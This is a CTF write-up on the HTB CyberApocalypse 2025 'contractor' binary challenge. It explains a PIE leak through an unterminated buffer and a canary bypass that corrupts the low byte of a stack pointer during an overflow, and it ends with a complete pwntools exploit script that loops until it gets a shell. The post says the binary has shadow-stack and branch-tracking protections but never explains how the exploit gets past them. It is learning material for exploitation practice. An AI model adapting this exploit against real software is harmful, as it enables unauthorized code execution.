
---
title: "HTB CyberApocalypse 2025 - Contractor: Exploiting Stack Pointer Corruption to Bypass Canaries" # Updated Title
description: "Detailed analysis of the HTB CyberApocalypse 2025 'Contractor' pwn challenge, demonstrating a technique to bypass stack canaries by corrupting a stack pointer during an overflow." # Updated Desc
date: "2025-05-01" # Updated date
categories: [pwn, cyberapocalypse2025, stack] # Updated categories
---

## Introduction

Stack buffer overflows are a classic vulnerability class, but modern defenses like Stack Canaries, NX (Non-Executable Stack), and PIE (Position Independent Executable) significantly complicate exploitation. Standard overflows that overwrite the return address (RIP) often corrupt the canary value placed below it, causing the program to detect the tampering and terminate via `__stack_chk_fail`. This post delves into stack exploitation techniques demonstrated in the Hack The Box CyberApocalypse 2025 CTF (March 21-26). Specifically, we analyze the `contractor` challenge to illustrate how a specific stack layout and a vulnerability in pointer usage can be combined to bypass stack canaries *without* leaking the canary value itself, achieving control flow hijacking by corrupting a different stack-based pointer *during* the overflow.

## Binary Analysis Context & Scenario  

The subject of this analysis is a 64-bit ELF binary from the CTF. The challenge description sets the scene:

> "Sir Alaric calls upon the bravest adventurers to join him in assembling the mightiest army in all of Eldoria. Together, you will safeguard the peace across the villages under his protection. Do you have the courage to answer the call?"

The program interacts by taking user details (name, reason, age, specialty) and then allowing edits. Key security mitigations enabled present a significant challenge:

```text
[*] './contractor'
Arch:       amd64-64-little
RELRO:      Full RELRO       (GOT protected)
Stack:      Canary found     (Stack overflow detection)
NX:         NX enabled       (No shellcode execution on stack)
PIE:        PIE enabled      (Address space randomization for binary)
RUNPATH:    b'./glibc/'
SHSTK:      Enabled          (Shadow Stack, additional control-flow protection)
IBT:        Enabled          (Indirect Branch Tracking, more CFI)
Stripped:   No               (Symbols available, helps analysis)
```
The presence of Canary, PIE, NX, SHSTK, and IBT means a simple overflow won't work; we need leaks and a way around the control-flow integrity checks and canary. The core vulnerabilities lie in how the 'specialty' field input is handled. A function named `contract` exists, which simply calls `execl("/bin/sh", "sh", 0)`, making it an ideal target address for our exploit payload.

```c
int64_t contract() {
    // Simplified - includes canary check logic before/after execl
    execl("/bin/sh", "sh", 0); // The goal function
    // ... canary check logic ...
    if (canary_corrupted) {
        __stack_chk_fail(); // Abort if canary is wrong
    }
    return 0; // Or similar exit path if execl fails
}
```

## Vulnerability 1: Information Leak via Unterminated String Read

The initial input routine reading the `specialty` field copies user input byte-by-byte into a 16-byte buffer on the stack.

```c
// Simplified C representation of the initial input loop for 'specialty'
char specialty_buffer[16];
char byte_read;
int i = 0;
while (i <= 0xf) // Reads up to 16 bytes (index 0 to 15)
{
    read(0, &byte_read, 1);
    if (byte_read == '\n')
        break;
    specialty_buffer[i] = byte_read;
    i++;
}
// CRITICAL FLAW: If exactly 16 bytes are read (i=16) before a newline,
// no null terminator ('\0') is added to specialty_buffer!
```

Later, when the program displays a summary of the entered information, it likely uses standard C library functions like `printf` or `puts` to print the `specialty`. These functions expect null-terminated strings. If `specialty_buffer` lacks a null terminator, these functions will continue reading adjacent data from the stack beyond the intended 16 bytes until they encounter a null byte or cause a crash.

Dynamic analysis (debugging with GDB/GEF) reveals that a pointer *into the binary's own code segment* (.text) resides on the stack immediately following `specialty_buffer`. When the unterminated buffer is printed, this pointer's bytes are included in the output, effectively leaking a runtime address within the binary.

**Bypassing PIE:** This address leak is crucial for defeating PIE.
1.  **Leak:** Obtain the leaked runtime address (e.g., `0x55...5b50`).
2.  **Analyze:** Determine the static offset of this address relative to the binary's base address using static analysis tools (e.g., Binary Ninja, `objdump`). Let's assume this offset is `0x1b50`.
3.  **Calculate:** Compute the runtime base address: `Runtime Base = Leaked Address - Static Offset` (e.g., `0x55...4000 = 0x55...5b50 - 0x1b50`).
With the base address known, we can calculate the runtime address of any desired function (`contract`) or ROP gadget within the binary.

## Vulnerability 2: Stack Buffer Overflow

When the user chooses option 4 to *edit* the `specialty` field, a different, more dangerous input routine is invoked.

```c
// Simplified C representation of the EDIT specialty loop
// rax_10 often holds a pointer related to the start of the stack frame or struct
char safe_buffer; // Reads one byte at a time
int i = 0;
while (i <= 0xff) // Loop condition allows reading up to 256 bytes!
{
    read(0, &safe_buffer, 1);
    if (safe_buffer == '\n')
        break;
    // Calculation eventually targets the 16-byte specialty_buffer area
    *(uint8_t*)(rax_10 + (int64_t)i + 0x10) = safe_buffer;
    i++;
}
```
This loop reads up to 256 bytes but attempts to write them into the stack region allocated for the 16-byte `specialty`. This provides a classic stack buffer overflow primitive, allowing an attacker to write data beyond the intended buffer, potentially overwriting saved registers (like RBP) and, crucially, the saved return address (RIP).

## Vulnerability 3 & Stack Layout: Canary Bypass via Stack Pointer Corruption

The primary obstacle to exploiting the overflow is the stack canary, placed by the compiler between local variables (like `specialty_buffer`) and the saved frame pointer (RBP) / return address (RIP) to detect overflows. A direct overflow overwriting RIP would also overwrite the canary, triggering `__stack_chk_fail`. This challenge allows bypassing the canary due to a specific stack layout and how the overflow write is implemented.

**Detailed Stack Layout Analysis (via Debugging):**
Dynamic analysis reveals the precise layout of relevant data on the stack during the execution of the function containing the vulnerable edit loop (higher addresses are "up" the stack, closer to the function return):

```text
      +-------------------------+ High Address  <-- Function Return
      | Saved RIP               | **Target for Overwrite** (Controls execution flow)
      +-------------------------+
      | Stack Canary            | **Obstacle** (Must NOT be modified before check)
      +-------------------------+
      | Saved RBP (Frame Ptr)   | (Often overwritten, but less critical here)
      +-------------------------+
      | Stack Ptr (*inf_ptr)    | ***Corruption Target*** (Pointer TO the user info struct)
      +-------------------------+
      | Binary Ptr (leaked val) | (Value leaked in Vuln 1)
      +-------------------------+
      | specialty_buffer[16]    | ***Overflow Source*** (16-byte buffer)
      +-------------------------+
      | Other local vars...     | (name, reason, age buffers etc.)
      +-------------------------+ Low Address
```

**Key Observations from Layout:**
* **`inf_ptr` Position:** A pointer variable named `inf_ptr` (or similar, found via reversing) exists on the stack. This pointer holds the starting address of the structure containing the user's name, reason, age, and specialty. Crucially, this `inf_ptr` variable is located *after* the `specialty_buffer` but *before* the Saved RBP and the Stack Canary.
* **Write Mechanism:** The vulnerable *edit* loop (Vulnerability 2) calculates the destination address for *each byte* it writes using this `inf_ptr`: the conceptual write is `*(inf_ptr + field_offset + loop_index) = input_byte;`.

**The Corruption Mechanism:**
The bypass exploits the fact that the pointer used for writing (`inf_ptr`) can itself be overwritten *during the overflow*, and this change takes effect *immediately* for subsequent writes within the same loop execution.
1.  The attacker crafts a payload that starts by filling the 16-byte `specialty_buffer`.
2.  The payload continues, overflowing past the buffer and the leaked Binary Pointer area.
3.  The payload reaches the memory location where the `inf_ptr` variable is stored.
4.  The attacker carefully crafts the payload to overwrite *only the Least Significant Byte (LSB)* of the `inf_ptr` value with a specific byte (e.g., `\xcf`). The exact byte needed depends on the runtime stack alignment (influenced by ASLR) and must be found via trial-and-error or calculation if alignment patterns are known.
5.  On the *next iteration* of the write loop (and all subsequent iterations), the now *corrupted* value of `inf_ptr` is used to calculate the write destination address.
6.  The change in the LSB effectively shifts the calculated destination address higher up the stack. This causes the remaining part of the attacker's payload (containing the desired ROP chain / target RIP address) to "jump" over the Saved RBP and the Stack Canary, landing directly onto the Saved RIP location.

Because the canary value itself is never overwritten, the `__stack_chk_fail` check passes when the function attempts to return, but execution resumes at the attacker-controlled address now stored in RIP.

## Exploitation Method Step-by-Step

The exploitation strategy combines these vulnerabilities:

1.  **Leak Binary Base Address:**
    * Send initial inputs (name, reason, age).
    * Send exactly 16 non-newline bytes for the `specialty` to trigger the unterminated read (Vulnerability 1).
    * Receive the program's output and parse the bytes immediately following the 16 input bytes to extract the leaked binary pointer.
    * Calculate the runtime base address of the binary using the leak and the known static offset.

2.  **Trigger Vulnerable Input:**
    * Select menu option 4 to trigger the vulnerable `edit` function for the `specialty` field (Vulnerability 2).

3.  **Craft Payload for Canary Bypass and RIP Control:**
    * Construct the payload buffer:
        * **Padding:** Bytes (e.g., 32 `A`s) to fill the `specialty_buffer`, overflow past the saved binary pointer, and reach the LSB of the `inf_ptr` variable on the stack.
        * **Corruption Byte:** The specific byte (e.g., `\xcf`) calculated or guessed to corrupt the LSB of `inf_ptr` appropriately for the current stack alignment.
        * **ROP Chain:** The sequence of addresses to be written to the stack *using the corrupted `inf_ptr`*. This typically includes:
            * `p64(address_of_ret_gadget)`: A `ret` instruction address (calculated using the leaked base address). This is often needed for stack alignment before calling functions, especially in 64-bit Linux.
            * `p64(address_of_contract_function)`: The target function address (calculated using the leaked base address).

4.  **Send Payload and Confirm:**
    * Send the crafted payload buffer when prompted for the new specialty.
    * Send the confirmation (e.g., "Yes") to finalize the edit.

5.  **Achieve Control:**
    * If the LSB corruption byte was correct for the current stack alignment, the payload overwrites the Saved RIP via the corrupted pointer mechanism, bypassing the canary check.
    * When the function returns, execution jumps to the `ret` gadget, then to the `contract` function, executing `execl("/bin/sh", ...)`.

6.  **Retry if Necessary:**
    * Because the success of the LSB corruption depends on runtime stack alignment (ASLR), the correct byte might vary slightly between executions.
    * Wrap the core exploitation logic (steps 2-5) in a loop that automatically restarts the process if it fails (e.g., the connection closes or expected output isn't received), trying the same corruption byte until it aligns correctly by chance.

## Exploit Code Snippet (Pwntools)

```python
#!/usr/bin/python3
from pwn import *
import warnings
import os

# --- Setup ---
context.arch = 'amd64'
# context.log_level = 'debug' # Use debug for verbose output
context.log_level = 'critical' # Use critical for clean retry loop
warnings.filterwarnings('ignore')

target = './contractor'
elf = ELF(target)

# --- Retry Loop ---
attempt_count = 0
while True:
    attempt_count += 1
    try:
        # connection = remote('ip', port) # For remote target
        connection = process(target) # Use process for local testing

        # --- Initial Interaction (Dummy data) ---
        connection.sendlineafter(b'> ', b'Exploiter')
        connection.sendlineafter(b'> ', b'Bypassing Canary')
        connection.sendlineafter(b'> ', b'99')

        # --- 1. Leak Address ---
        leak_trigger = b'A' * 16 # Exactly 16 bytes, no newline
        connection.sendlineafter(b'> ', leak_trigger)
        connection.recvuntil(leak_trigger) # Read until the end of our input
        leaked_bytes = connection.recvline().strip() # Next line contains leak
        # Ensure correct padding and unpacking
        try:
             leaked_addr = u64(leaked_bytes.ljust(8, b'\x00'))
        except struct.error:
             print(f"\r[-] Attempt {attempt_count}: Failed to unpack leak: {leaked_bytes}", flush=True)
             connection.close()
             continue # Retry

        # Static offset found via GDB/Binja: address_in_leak - base_address
        static_offset = 0x1b50
        elf.address = leaked_addr - static_offset # Calculate runtime base
        print(f'\r[+] Attempt {attempt_count}: Base @ {hex(elf.address)}', end='', flush=True)

        # --- 2. Trigger Overflow ---
        connection.sendlineafter(b'> ', b'4') # Select option 4 to edit specialty

        # --- 3. Craft Payload ---
        # Padding size needs careful calculation based on GDB analysis
        # It must reach exactly the LSB of the stack pointer variable (*inf_ptr)
        padding_to_ptr_lsb = 32 # Example value, ADJUST BASED ON DEBUGGING
        corruption_byte = b'\xcf' # The byte to corrupt LSB, needs luck/retry
        ret_gadget_offset = 0x101a # Offset of a 'ret;' instruction
        target_func_offset = elf.sym.contract # Offset of target function

        payload = b'A' * padding_to_ptr_lsb
        payload += corruption_byte
        # ROP Chain - written via corrupted pointer, lands on RIP
        payload += p64(elf.address + ret_gadget_offset) # RET for alignment
        payload += p64(elf.address + target_func_offset)  # Address of contract()

        # --- 4. Send Payload ---
        connection.sendlineafter(b': ', payload) # Send the overflow payload
        connection.sendlineafter(b'> ', b'Yes') # Confirm the edit

        # --- 5. Check for Success (Try running a command) ---
        connection.sendline(b'echo HACKED_SUCCESS') # Send command to potential shell
        result = connection.recvline_contains(b'HACKED_SUCCESS', timeout=0.3) # Increased timeout slightly

        if b'HACKED_SUCCESS' in result:
            print(f'\n\n[!] Success on attempt {attempt_count}! Shell obtained.')
            connection.interactive() # Get interactive shell
            break # Exit retry loop

        # If command didn't work, assume exploit failed for this alignment
        connection.close()

    except EOFError: # Process likely crashed or closed connection
        # print(f"\r[-] Attempt {attempt_count}: EOFError", flush=True) # Uncomment for debug
        connection.close()
    except Exception as e: # Catch other potential errors
        # print(f"\r[-] Attempt {attempt_count}: Error {e}", flush=True) # Uncomment for debug
        connection.close()

# Optional: Add a max attempts check here if desired
# if not connection.connected:
#    print("\n[-] Exploit failed after multiple attempts.")

```

## Conclusion

This analysis of the `contractor` challenge from HTB CyberApocalypse 2025 demonstrated a practical technique for bypassing stack canaries without needing to leak the canary value itself. By leveraging a detailed understanding of the stack layout gained through debugging, and exploiting the immediate effect of overwriting a stack-based pointer used within the overflow routine itself, control flow hijacking was achieved despite multiple modern defenses (Canary, PIE, NX, SHSTK, IBT). This highlights that even with layered security, vulnerabilities in specific code patterns and memory layouts can provide viable exploitation paths, often requiring careful analysis and sometimes non-deterministic techniques like the retry loop used here to handle ASLR-induced alignment variations.
